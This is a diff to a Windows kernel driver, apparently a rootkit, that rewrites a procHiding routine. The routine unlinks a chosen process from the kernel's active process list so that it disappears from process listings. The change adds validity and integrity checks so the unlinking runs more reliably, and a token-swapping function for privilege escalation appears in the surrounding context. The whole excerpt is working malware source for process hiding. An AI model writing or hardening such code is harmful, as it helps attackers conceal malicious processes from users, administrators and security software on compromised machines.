@@ -582,33 +582,53 @@ NTSTATUS procTokenSwap(DWORD pid1,DWORD pid2, int offset) {
     return STATUS_SUCCESS;
 }
 
-NTSTATUS procHiding(DWORD pidVal, int offset) {
-	NTSTATUS status;
-
+NTSTATUS procHiding(DWORD pidVal, DWORD offset) {
+    NTSTATUS status;
     PEPROCESS eProcess = NULL;
+
     status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);
     if (!NT_SUCCESS(status)) {
         DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
-            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
-            DRIVER_NAME, (unsigned long long)pidVal, status);
-        return STATUS_UNSUCCESSFUL;
-	}
+            "[%s] PsLookupProcessByProcessId failed for PID %lu (0x%08X)\n",
+            DRIVER_NAME, pidVal, status);
+        return status;
+    }
+
+    // Attach to target process context to safely access its memory
 
     LIST_ENTRY* listEntry = (LIST_ENTRY*)((UINT64)eProcess + offset);
-	listEntry->Flink->Blink = listEntry->Blink;
-	listEntry->Blink->Flink = listEntry->Flink;
-    
-    if (listEntry->Flink == listEntry && listEntry->Blink == listEntry) {
-        DbgPrintEx(0, 0, "[%s] Successfully removed process from active process list for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
-    }
-    else {
-        DbgPrintEx(0, 0, "[%s] Failed to remove process from active process list for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
-        ObDereferenceObject(eProcess);
-        return STATUS_UNSUCCESSFUL;
-	}
-	return STATUS_SUCCESS;
-}
 
+    // Comprehensive memory validation
+    if (!MmIsAddressValid(listEntry) ||
+        !MmIsAddressValid(listEntry->Flink) ||
+        !MmIsAddressValid(listEntry->Blink)) {
+        ObDereferenceObject(eProcess);
+        return STATUS_ACCESS_VIOLATION;
+    }
+	DbgPrintEx(0, 0, "[%s] Hiding process PID %lu\n", DRIVER_NAME, pidVal);
+
+
+
+    // Enhanced list integrity check
+    if (listEntry->Flink->Blink != listEntry || listEntry->Blink->Flink != listEntry) {
+        ObDereferenceObject(eProcess);
+        DbgPrintEx(0, 0, "[%s] List integrity check failed for PID %lu\n", DRIVER_NAME, pidVal);
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    // Perform the removal
+    listEntry->Flink->Blink = listEntry->Blink;
+    listEntry->Blink->Flink = listEntry->Flink;
+
+    // Self-link
+    listEntry->Flink = listEntry;
+    listEntry->Blink = listEntry;
+
+    ObDereferenceObject(eProcess);
+
+    DbgPrintEx(0, 0, "[%s] Successfully hid process PID %lu\n", DRIVER_NAME, pidVal);
+    return STATUS_SUCCESS;
+}
 UINT64 FindKernelBase() {
     UNICODE_STRING functionName;
     PFN_ZwQuerySystemInformation querySysInfo;
